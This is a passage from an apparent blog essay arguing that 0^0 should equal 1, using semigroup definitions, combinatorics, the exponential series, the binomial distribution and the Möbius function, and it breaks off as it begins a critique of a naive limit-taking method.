<p>The value of 0<sup>0</sup> is controversial.</p>

<p><a href="https://en.wikipedia.org/wiki/Zero_to_the_power_of_zero">Wikipedia</a> says:</p>

<blockquote>
  <p>Zero to the power of zero, denoted by 0<sup>0</sup>, is a mathematical expression with no agreed-upon value.
The most common possibilities are 1 or leaving the expression undefined,
with justifications existing for each, depending on context.</p>
</blockquote>

<p>Mathematica and <a href="https://www.wolframalpha.com/input/?i=0%5E0">WolframAlpha</a> refuse to compute the value.</p>

<p>Some textbooks on mathematical analysis, when defining exponentiation, explicitly leave 0<sup>0</sup> undefined
as an exception.</p>

<p>On the other hand, the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> floating point standard specifies
that 0.0<sup>0.0</sup> = 1.0 and as a result, most programming languages implement it that way.</p>

<p>Spoiler: I will argue that the value of 1 is clearly “correct”. Of course it’s a matter of definition,
one can in theory define the operation to do anything, but it is “correct” in the sense that it is the only sensible
value, consistent with all applications, and moreover, it is a very important value. It is also
implicitly assumed to be 1 in various formulas even by those people who insist it should not be 1.</p>

<p>I will also show that the argument against defining 0<sup>0</sup> essentially relies on a mistake:
an incorrect algorithm for computing limits that is unfortunately often taught in schools. Refusal
to define 0<sup>0</sup> is a futile attempt to salvage the correctness of the algorithm, which however
does not actually solve the problem in general.</p>

<h2 id="definition">Definition</h2>

<p>The simplest way to resolve the issue seems to be to start with a definition, plug in zeroes, and see
what we get.</p>

<p>A <strong>semigroup</strong> is a set of objects with an associative multiplication operation. This is a very
general concept: it can be natural numbers, real numbers, square matrices, linear operators, all
kinds of things.</p>

<p>In any semigroup we can define exponentiation to any positive integral power:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mn>1</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>x</mi><mi>n</mi></msup><mo>⋅</mo><mi>x</mi></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
x^1 &amp;= x \\
x^{n+1} &amp;= x^n \cdot x
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>Often a semigroup has an identity element <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span></span>
such that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo>⋅</mo><mi>x</mi><mo>=</mo><mi>x</mi><mo>⋅</mo><mi>I</mi><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">I\cdot x = x\cdot I = x</annotation></semantics></math></span></span>.
For numbers, it’s just the number 1. For matrices, it’s the identity matrix.
Such a semigroup is called a <strong>monoid</strong>.</p>

<p>In a monoid we expand and simplify the definition of exponentiation to include the 0 exponent:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mn>0</mn></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>I</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>x</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>x</mi><mi>n</mi></msup><mo>⋅</mo><mi>x</mi></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
x^0 &amp;= I \\
x^{n+1} &amp;= x^n \cdot x
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>Well, now just plug in x=0 into that definition and what do you get: 0<sup>0</sup> = 1.</p>

<p>This definition can then be extended to negative exponents, rational exponents, even irrational exponents.
But since we’re only concerned with 0<sup>0</sup> here, we’re not going to go further.</p>

<h2 id="the-0n-function">The 0<sup>n</sup> function</h2>

<p>Since 0<sup>n</sup> = 0 for all n &gt; 0, one might think that the most natural thing to expect is
that it would also be true for n = 0. However we see from the definition that it is not so.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msup><mn>0</mn><mi>n</mi></msup><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mo>=</mo><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
0^n =
\begin{cases}
1 &amp;\text{if } n = 0 \\
0 &amp;\text{if } n &gt; 0
\end{cases}
= [n=0]
</annotation></semantics></math></span></span></p>

<p>We have here used the <a href="https://en.wikipedia.org/wiki/Iverson_bracket">Iverson bracket</a> notation.</p>

<p>This seems like a strangely complicated formula for 0<sup>n</sup>, but we will see that it is in fact
a very nice and useful function.</p>

<h2 id="combinatorics">Combinatorics</h2>

<p>What is the number of sequences of n letters, selected from an alphabet of size A? It’s A<sup>n</sup>.</p>

<p>What if the alphabet is empty, A=0? Then the number of sequences is:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msup><mn>0</mn><mi>n</mi></msup><mo>=</mo><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
0^n = [n = 0] =
\begin{cases}
1 &amp;\text{if } n = 0 \\
0 &amp;\text{if } n &gt; 0
\end{cases}
</annotation></semantics></math></span></span></p>

<p>Does this make sense? Yes! If n &gt; 0, we can’t form a sequence, because
we will get stuck when trying to write the first letter. But when n=0, there is no problem! We don’t
have to write any letters, so it’s fine if the alphabet is empty. There is exactly one way to do it:
write an empty sequence of letters.</p>

<h2 id="the-exp-function">The exp function</h2>

<p>The exponential function has the following basic property, often taken to define exp in the first place:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>exp</mi><mo>⁡</mo><mi>x</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mfrac><msup><mi>x</mi><mi>n</mi></msup><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\exp x = \sum_{n=0}^{\infty} \frac{x^n}{n!}
</annotation></semantics></math></span></span></p>

<p>Let’s plug in x=0:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>exp</mi><mo>⁡</mo><mn>0</mn><mo>=</mo><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mfrac><msup><mn>0</mn><mi>n</mi></msup><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac><mo>=</mo><munderover><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow><mi mathvariant="normal">∞</mi></munderover><mfrac><mrow><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo></mrow><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mn>0</mn><mo stretchy="false">!</mo></mrow></mfrac><mo>=</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\exp 0 = \sum_{n=0}^{\infty} \frac{0^n}{n!} = \sum_{n=0}^{\infty} \frac{[n=0]}{n!} = \frac{1}{0!} = 1
</annotation></semantics></math></span></span></p>

<p>The 0<sup>n</sup> function played an essential role in this calculation.</p>

<h2 id="the-binomial-distribution">The binomial distribution</h2>

<p>The binomial distribution is a probability distribution of the number of successes in n independent
trials, each successful with probability p. The formula is:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>Pr</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><msup><mi>p</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>p</mi><msup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo>−</mo><mi>k</mi></mrow></msup></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\Pr(X = k) = \binom{n}{k}p^k(1-p)^{n-k}
</annotation></semantics></math></span></span></p>

<p>What if p=0?</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>Pr</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><msup><mn>0</mn><mi>k</mi></msup><msup><mn>1</mn><mrow><mi>n</mi><mo>−</mo><mi>k</mi></mrow></msup><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">[</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>k</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>k</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
\Pr(X = k) &amp;= \binom{n}{k}0^k1^{n-k} = \binom{n}{k}[k=0] = [k=0] \\
&amp;=
\begin{cases}
1 &amp;\text{if } k = 0 \\
0 &amp;\text{if } k &gt; 0
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>This makes sense! k=0 successes is certain, any other outcome is impossible.</p>

<h2 id="even-cardinality-subsets">Even-cardinality subsets</h2>

<p>Given a set of n elements, how many more even-cardinality subsets are there than odd-cardinality subsets?</p>

<p>We can calculate it like this:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></munderover><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>k</mi></msup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></munderover><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>k</mi></msup><msup><mn>1</mn><mrow><mi>n</mi><mo>−</mo><mi>k</mi></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo>+</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><msup><mn>0</mn><mi>n</mi></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
\sum_{k=0}^n \binom{n}{k}(-1)^k &amp;= \sum_{k=0}^n \binom{n}{k}(-1)^k1^{n-k} = (-1 + 1)^n = 0^n \\
&amp;=
\begin{cases}
1 &amp;\text{if } n = 0 \\
0 &amp;\text{if } n &gt; 0
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>And indeed, for n=0 we have 1 even-cardinality subset (the empty set), and no odd-cardinality subsets,
while for n&gt;0 there are as many even as odd cardinality subsets.</p>

<h2 id="möbius-function">Möbius function</h2>

<p>The <a href="https://en.wikipedia.org/wiki/M%C3%B6bius_function">Möbius function</a> <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mu(n)</annotation></semantics></math></span></span>
is a useful <a href="https://en.wikipedia.org/wiki/Multiplicative_function">multiplicative function</a> in number theory.</p>

<p>One important property of it concerns sums over divisors of a positive integer n:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>d</mi><mi mathvariant="normal">∣</mi><mi>n</mi></mrow></munder><mi>μ</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">)</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
S(n) = \sum_{d|n} \mu(d)
</annotation></semantics></math></span></span></p>

<p>It can be shown that since μ is multiplicative, S is also multiplicative.</p>

<p>Also for prime p and α &gt; 0:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>S</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>α</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mi>μ</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>μ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>+</mo><mi>μ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>+</mo><mo>…</mo><mo>+</mo><mi>μ</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mi>α</mi></msup><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><mn>1</mn><mo>+</mo><mn>0</mn><mo>+</mo><mo>…</mo><mo>+</mo><mn>0</mn><mo>=</mo><mn>0</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
S(p^\alpha) = \mu(1) + \mu(p) + \mu(p^2) + \ldots + \mu(p^\alpha) = 1 - 1 + 0 + \ldots + 0 = 0
</annotation></semantics></math></span></span></p>

<p>Let’s factor n into prime numbers:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi>n</mi><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msubsup><mi>p</mi><mi>i</mi><msub><mi>α</mi><mi>i</mi></msub></msubsup></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
n = \prod_{i=1}^{k} p_i^{\alpha_i}
</annotation></semantics></math></span></span></p>

<p>and then we have:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>S</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>S</mi><mrow><mo fence="true">(</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msubsup><mi>p</mi><mi>i</mi><msub><mi>α</mi><mi>i</mi></msub></msubsup><mo fence="true">)</mo></mrow><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mi>S</mi><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><msub><mi>α</mi><mi>i</mi></msub></msubsup><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mn>0</mn><mo>=</mo><msup><mn>0</mn><mi>k</mi></msup><mo>=</mo><mo stretchy="false">[</mo><mi>k</mi><mo>=</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>n</mi><mo>=</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>n</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
S(n) &amp;= S\left(\prod_{i=1}^{k} p_i^{\alpha_i}\right) = \prod_{i=1}^k S(p_i^{\alpha_i}) = \prod_{i=1}^k 0 = 0^k
= [k=0] = [n=1] \\
&amp;= \begin{cases}
1 &amp;\text{if } n = 1 \\
0 &amp;\text{if } n &gt; 1
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<h2 id="fractional-exponents">Fractional exponents</h2>

<p>What about the 0<sup>x</sup> function for <strong>real</strong> (rather than natural) exponents <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>≥</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x \ge 0</annotation></semantics></math></span></span>?</p>

<p>Some people argue that while the case for 0<sup>n</sup>=[n=0] is convincing, the case for 0<sup>x</sup>=[x=0]
is less convincing, and 0<sup>0</sup> should only be defined for the integral exponent 0, and left undefined
for the real exponent 0.0.</p>

<p>I have three ways to answer that.</p>

<h3 id="natural-numbers-are-real-numbers">Natural numbers are real numbers</h3>

<p>A ubiquitous convention in mathematics is that natural numbers are a subset of integer
numbers, which in turn are a subset of rational numbers, which are a subset of real numbers.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mi mathvariant="double-struck">N</mi><mo>⊂</mo><mi mathvariant="double-struck">Z</mi><mo>⊂</mo><mi mathvariant="double-struck">Q</mi><mo>⊂</mo><mi mathvariant="double-struck">R</mi></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\mathbb{N} \subset \mathbb{Z} \subset \mathbb{Q} \subset \mathbb{R}
</annotation></semantics></math></span></span></p>

<p>This lets us mix and match integers with rational numbers and irrational numbers in expressions
without having to worry about converting between these types.</p>

<p>If so, it makes no sense to say that 0<sup>0</sup>=1 but 0<sup>0.0</sup> is undefined, because
the natural number 0 is the same number as the real number 0.0.</p>

<p>One reason to doubt this is how numbers are constructed from sets in set theory. Natural numbers
are constructed first. Then integers are constructed as equivalence classes of pairs of natural numbers.
Similarly rational numbers are then constructed as equivalence classes of pairs of integers. Finally real
numbers are constructed from rational numbers using Dedekind cuts or Cauchy sequences.</p>

<p>If we literally follow such a construction, then indeed the natural number 0, the integer 0,
the rational number 0, and the real number 0 will be four different objects. However, there is
an easy fix. When constructing integers as certain equivalence classes of pairs of natural numbers,
we can simply replace the non-negative integers with the actual natural numbers. Similarly, we can
replace the “integral rationals” with actual integers, and “rational reals” with the actual rationals.
After we do that, the 0 number is the same object belonging to all four sets.</p>

<h3 id="consistency-is-good">Consistency is good</h3>

<p>Even if one were to treat integers as disjoint from reals, it would be nice to know that if
the notation a<sup>b</sup> means something for integers a and b, then it also means the equivalent
thing for the real equivalents of a and b. Technically what it means is that it would be nice if the integer-to-real
mapping was a homomorphism for the a<sup>b</sup> operation.</p>

<p>Otherwise, if the notation changed meaning between the “integer context” and “real context”, we would have to be
extremely careful about which context we are in! And it wouldn’t be clear from notation such as
x<sup>0</sup>. It would be a mess. We don’t want notation to be ambiguous.</p>

<h3 id="0x-is-sometimes-useful-for-fractional-exponents">0<sup>x</sup> is sometimes useful for fractional exponents</h3>

<p>What is the (right-sided) derivative of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mi>p</mi></msup></mrow><annotation encoding="application/x-tex">x^p</annotation></semantics></math></span></span> at x = 0 for <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>≥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p\ge 1</annotation></semantics></math></span></span>?
Let’s calculate:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mrow><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>x</mi><mi>p</mi></msup></mrow><mo fence="true">∣</mo></mrow><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msub><mrow><mrow><mi>p</mi><msup><mi>x</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><mo fence="true">∣</mo></mrow><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow></msub><mo>=</mo><mi>p</mi><mo>⋅</mo><msup><mn>0</mn><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mi>p</mi><mo stretchy="false">[</mo><mi>p</mi><mo>=</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mo stretchy="false">[</mo><mi>p</mi><mo>=</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>p</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>p</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow></mstyle></mtd></mtr></mtable></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\begin{aligned}
\left.{\frac{d}{dx}x^p}\right\vert_{x=0} &amp;= \left.{p x^{p-1}}\right\vert_{x=0} = p\cdot 0^{p-1} = p[p=1] = [p=1] \\
&amp;= \begin{cases}
1 &amp;\text{if } p = 1 \\
0 &amp;\text{if } p &gt; 1
\end{cases}
\end{aligned}
</annotation></semantics></math></span></span></p>

<p>And indeed this is correct! The derivative at x = 0 is 1 for p = 1, and 0 for p &gt; 1. The derivative
at 0 discontinuously “jumps” from 1 to 0 as soon as we increase the exponent p even slightly above 1.</p>

<h2 id="the-naive-limit-algorithm">The naive limit algorithm</h2>

<p>Given all these nice uses of 0<sup>0</sup> = 1, why do some people resist defining it like this?</p>

<p>The only reason I have seen has to do with what I call the “naive limit algorithm”.</p>

<p>Suppose we want to calculate this limit:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msup><mrow><mo fence="true">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow></msup></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} \left(n^2 3^{-n}\right)^{1/n}
</annotation></semantics></math></span></span></p>

<p>The argument goes that somebody could calculate it like this:</p>
